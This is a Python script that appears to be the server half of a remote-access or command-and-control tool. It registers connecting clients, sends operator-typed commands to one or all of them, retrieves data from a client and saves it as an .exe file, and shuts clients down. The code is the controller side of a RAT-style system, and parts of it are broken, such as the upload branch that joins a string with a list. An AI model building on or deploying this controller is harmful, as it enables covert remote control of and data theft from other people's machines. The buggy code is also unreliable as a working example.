#!/usr/bin/env python3

import time
import socket
import threading

HOST = "127.0.0.1"
PORT = 65432

class Client:
    address = None
    connection = None
    info = None

clients = []

def ThreadRegisterClient(client):
    print("[INFO] Connected to" + str(client.address))
    print("[DEBUG] Client: " + str(client.connection))

    try:
        while True:
            data = client.connection.recv(256)
            if not data:
                break

            print("Got data: " + str(data));
            command = data.decode()
            if command == "login":
                print("[INFO] Got login response. Sending info command...")
                client.connection.send(b"info")

                data = client.connection.recv(256)
                if not data:
                    break

                print("[INFO] Got info response...")
                client.info = data.decode()
                break
            else:
                client.connection.send(data)
    except socket.timeout:
        print("[EXCEPTION] Connection timed out!")
    except Exception as e:
        print("[EXCEPTION] Unknown exception: " + str(e))

    print("[INFO] Client connected and registered.")

def ThreadStartServer():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print("[INFO] Binding to " + HOST + " and " + str(PORT) + "...")
        s.bind((HOST, PORT))
        print("[INFO] Listening...")
        s.listen()

        while True:
            conn, addr = s.accept()
            with conn:
                conn_dup = conn.dup() # We duplicate the connection because it somehow gets destroyed after starting a new thread

            client = Client()
            client.connection = conn_dup
            client.address = addr
            clients.append(client)

            threading.Thread(target=ThreadRegisterClient,args=(client,)).start()

        s.close()

def ReceiveDataFromClient(client, command):
    client.connection.send(command.encode())
    
    fullData = bytearray()
    while True:
        fileSize = client.connection.recv(8)
        if str(fileSize.decode()) == "0":
            break;

        data = client.connection.recv(256)
        fullData += data

    return fullData

threading.Thread(target=ThreadStartServer).start()

time.sleep(1)

print("""Available commands:
* list: Lists down available clients.
* cmd: Run command on client.
* shutdown: Shuts down the client.\n""")

while True:
    command = input(">> ")
    
    if command == "list":
        if len(clients) > 0:
            i = 0
            for c in clients:
                print("Client " + str(i) + ": " + c.info)
                i += 1
        else:
            print("No available clients.\n")
            
    elif command.startswith("cmd"):
        commandSplitted = command.strip().split(" ")
        if len(commandSplitted) > 1:
            cleanedCommand = str(commandSplitted[0] + ' ' + ' '.join(commandSplitted[2:]))
            
            if commandSplitted[1] == "all":
                for client in clients:
                    receivedData = ReceiveDataFromClient(client, cleanedCommand)
                    print("Received from " + client.info + ":\n" + receivedData.decode());
            else:
                try:
                    clientNumber = int(commandSplitted[1])

                    client = clients[clientNumber]
                    receivedData = ReceiveDataFromClient(client, cleanedCommand)
                    print("Received from " + client.info + ":\n" + receivedData.decode());

                except ValueError as e:
                    print("[ERROR] " + str(e))
        else:
            print("[ERROR] cmd: No arguments specified.")

    elif command.startswith("upload"):
        
        commandSplitted = command.strip().split(" ")
        client = clients[0]

        receivedData = ReceiveDataFromClient(client, commandSplitted[0] + commandSplitted[2:]);
        f = open("X:\\output\\test.exe", "wb")
        if f:
            print("## Writing to test.exe");
            f.write(receivedData)
            f.close()
        else:
            print("##  Error opening file for writing.")
            
    elif command.startswith("shutdown"):
        commandSplitted = command.strip().split(" ")
        if len(commandSplitted) > 1:
            if commandSplitted[1] == "all":
                for client in clients:
                    client.connection.send(b"shutdown")

                    print("[INFO] Closing the connection for " + str(client.address))
                    client.connection.close()

                clients.clear()
            else:
                clientNumber = int(commandSplitted[1])

                try:
                    client = clients[clientNumber]
                    client.connection.send(b"shutdown")

                    print("[INFO] Closing the connection for " + str(client.address))
                    client.connection.close()
                    clients.remove(client)
                except IndexError as e:
                    print("[ERROR] " + str(e))
                
        else:
            print("[ERROR] Incorrect shutdown invocation. Specify \"shutdown [number]\" or \"shutdown all\"")
